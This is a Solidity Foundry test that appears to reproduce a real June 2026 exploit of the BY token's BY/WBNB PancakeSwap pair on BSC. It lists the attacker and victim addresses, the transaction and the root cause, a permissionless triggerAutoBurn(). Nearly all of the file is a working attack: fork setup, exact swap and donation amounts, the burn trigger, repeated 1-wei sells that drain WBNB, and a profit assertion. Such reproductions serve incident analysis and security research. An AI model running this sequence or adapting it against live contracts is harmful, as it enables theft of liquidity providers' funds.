// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$87,402 (146.60 WBNB drained from the BY/WBNB PancakeSwap pair)
// Attacker EOA     : 0x047547A4fa4a67C1032d249B49EC1a79c0460BAD
// Attacker Contract: 0xc08106a36BfA9CFad264F0d64fC45B93543485Ec
// Vulnerable       : 0x6f50cffEcd4e00EcF7E442774C08c089450B62Ca (BY token)
// Victim pair      : 0x1F358e18e0DB68FF33C2319C8DaD328eDF9B7059 (BY/WBNB)
// Attack Tx        : 0xe31c681eee764fb94b1b6bda3bbb0e4f25acb129c19040b9f58ad30541980979
// Attack date      : June 4, 2026  Chain: BSC  Block: 102329719
// SlowMist         : https://hacked.slowmist.io/ (BY, BSC, ~$87.4K)
//
// Root cause: triggerAutoBurn() is permissionless.
// Attacker corners BY supply via router, donates WBNB to hit trading threshold,
// triggers burn to crash BY reserve, then sells tiny BY to drain WBNB.

interface IBYToken is IERC20 {
    function triggerAutoBurn() external;
    function lastBurnTimestamp() external view returns (uint256);
    function BURN_INTERVAL() external view returns (uint256);
    function getBNBPrice() external view returns (uint256);
    function TRADING_ENABLE_BNB_THRESHOLD() external view returns (uint256);
    function tradingEnabled() external view returns (bool);
}

contract BYTokenExploitTest is Test {
    IBYToken constant BY     = IBYToken(0x6f50cffEcd4e00EcF7E442774C08c089450B62Ca);
    IERC20   constant WBNBT  = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair constant PAIR = IPancakePair(0x1F358e18e0DB68FF33C2319C8DaD328eDF9B7059);
    IPancakeRouter constant ROUTER = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    uint256 constant ATTACK_BLOCK = 102_329_719;
    uint256 constant FLASH_AMOUNT = 422_497e18;
    uint256 constant BUY1    = 7_098_440_043_949_538_042_178;
    uint256 constant DONATE  = 32_754_957_105_274_843_900_451;
    uint256 constant BUY2    = 37_183_223_545_589_637_811_339;

    function setUp() public {
        vm.createSelectFork("bsc", ATTACK_BLOCK - 1);
        vm.label(address(BY),    "BY");
        vm.label(address(WBNBT), "WBNB");
        vm.label(address(PAIR),  "BY/WBNB-Pair");
        uint256 lastBurn = BY.lastBurnTimestamp();
        uint256 interval = BY.BURN_INTERVAL();
        vm.warp(lastBurn + interval + 1);
    }

    function testRecon() public view {
        (uint112 rBY, uint112 rWBNB,) = PAIR.getReserves();
        console.log("BY   reserve:", uint256(rBY)   / 1e18);
        console.log("WBNB reserve:", uint256(rWBNB) / 1e18, "(prize)");
        console.log("tradingEnabled:", BY.tradingEnabled());
    }

    function testExploit() public {
        deal(address(WBNBT), address(this), FLASH_AMOUNT);
        uint256 wbnbBefore = WBNBT.balanceOf(address(this));

        WBNBT.approve(address(ROUTER), type(uint256).max);
        BY.approve(address(ROUTER), type(uint256).max);

        address[] memory wToBY = new address[](2);
        wToBY[0] = address(WBNBT); wToBY[1] = address(BY);

        address[] memory byToW = new address[](2);
        byToW[0] = address(BY); byToW[1] = address(WBNBT);

        uint256 dl = block.timestamp + 1000;

        // Step 1: corner buy - BY discarded to router
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(BUY1, 0, wToBY, address(ROUTER), dl);

        // Step 2: donate WBNB + sync to hit trading threshold
        WBNBT.transfer(address(PAIR), DONATE);
        PAIR.sync();

        // Step 3: buy BY for self
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(BUY2, 0, wToBY, address(this), dl);

        // Step 4: burn BY from pair - crashes reserve
        BY.triggerAutoBurn();

        // Step 5: drain 1 wei x5
        for (uint256 i; i < 5; i++) {
            ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(1, 0, byToW, address(this), dl);
        }

        // Step 6: sell remaining BY
        uint256 byBal = BY.balanceOf(address(this));
        if (byBal > 0) {
            ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(byBal, 0, byToW, address(this), dl);
        }

        uint256 wbnbAfter = WBNBT.balanceOf(address(this));
        uint256 profit = wbnbAfter > wbnbBefore ? wbnbAfter - wbnbBefore : 0;
        console.log("WBNB before:", wbnbBefore / 1e18);
        console.log("WBNB after :", wbnbAfter  / 1e18);
        console.log("Profit WBNB:", profit / 1e18);

        assertGt(profit, 0, "no profit");
    }
}
